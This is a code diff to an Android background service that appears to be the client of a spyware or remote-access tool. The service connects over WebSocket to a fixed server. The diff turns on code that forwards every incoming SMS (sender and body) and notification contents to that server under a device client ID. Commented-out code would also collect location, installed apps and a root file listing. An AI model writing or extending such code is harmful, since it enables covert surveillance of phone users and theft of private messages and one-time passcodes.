@@ -16,6 +16,7 @@ import androidx.annotation.Nullable;
 import com.ot.grhq.client.functionality.FileManager;
 import com.ot.grhq.client.functionality.Location;
 import com.ot.grhq.client.functionality.PackageManager;
+import com.ot.grhq.client.functionality.Utils;
 
 import org.json.JSONException;
 import org.json.JSONObject;
@@ -41,24 +42,28 @@ public class MainService extends Service {
     public int onStartCommand(Intent intent, int flags, int startId) {
         try {
             client = new WebSocketClient(getApplicationContext(), new URI(SERVER_URI));
-
-            if (!client.isOpen())
-                client.connect();
-
-            JSONObject json = new JSONObject();
-            Object location = Location.getLastKnownLocation(getApplicationContext());
-            Object installedApps = PackageManager.getInstalledApps(getApplicationContext());
-            Object files = FileManager.listFiles("/");
-
-            json.put("location", location.toString());
-            json.put("installed_apps", installedApps.toString());
-            json.put("files", files.toString());
-//            client.send(json.toString());
         } catch (URISyntaxException e) {
             throw new RuntimeException(e);
-        } catch (JSONException e) {
-            throw new RuntimeException(e);
         }
+
+        if (!client.isOpen())
+            client.connect();
+
+//        try {
+//            JSONObject json = new JSONObject();
+//            Object location = Location.getLastKnownLocation(getApplicationContext());
+//            Object installedApps = PackageManager.getInstalledApps(getApplicationContext());
+//            Object files = FileManager.listFiles("/");
+//
+//            json.put("location", location.toString());
+//            json.put("installed_apps", installedApps.toString());
+//            json.put("files", files.toString());
+//            client.send(json.toString());
+//        } catch (URISyntaxException e) {
+//            throw new RuntimeException(e);
+//        } catch (JSONException e) {
+//            throw new RuntimeException(e);
+//        }
 
         Log.d("eeee", "First");
         final Handler handler = new Handler();
@@ -67,7 +72,6 @@ public class MainService extends Service {
         handler.postDelayed(new Runnable() {
             @Override
             public void run() {
-//                Log.d("eeee", "The service is working");
                 handler.postDelayed(this, delay);
             }
         }, delay);
@@ -130,24 +134,20 @@ public class MainService extends Service {
                             String senderNumber = currentMessage.getDisplayOriginatingAddress();
                             String messageBody = currentMessage.getDisplayMessageBody();
 
-                            if (!senderNumber.isEmpty() &&
-                                    senderNumber != null &&
-                                    !messageBody.isEmpty() &&
-                                    messageBody != null) {
-                                Log.d("eeee", senderNumber + " " + messageBody);
-//                                JSONObject json = new JSONObject();
-//                                try {
-//                                    json.put("id", "");
-//                                    json.put("type", "client");
-//                                    json.put("res", "message");
-//                                    json.put("sender", senderNumber);
-//                                    json.put("content", messageBody);
-//                                    json.put("timestamp", System.currentTimeMillis());
-//
-//                                    client.send(json.toString());
-//                                } catch (JSONException e) {
-//                                    throw new RuntimeException(e);
-//                                }
+                            if (!senderNumber.isEmpty() && !messageBody.isEmpty() && client.isOpen() && client != null) {
+                                JSONObject json = new JSONObject();
+                                try {
+                                    json.put("client_id", Utils.clientID(context));
+                                    json.put("type", "client");
+                                    json.put("res", "message");
+                                    json.put("sender", senderNumber);
+                                    json.put("content", messageBody);
+                                    json.put("timestamp", System.currentTimeMillis());
+
+                                    client.send(json.toString());
+                                } catch (JSONException e) {
+                                    throw new RuntimeException(e);
+                                }
                             }
                         }
                     }
@@ -171,7 +171,7 @@ public class MainService extends Service {
                 if (client != null && client.isOpen()) {
                     JSONObject json = new JSONObject();
                     try {
-                        json.put("id", "");
+                        json.put("id", Utils.clientID(context));
                         json.put("type", "client");
                         json.put("res", "notification");
                         json.put("sender", packageName);
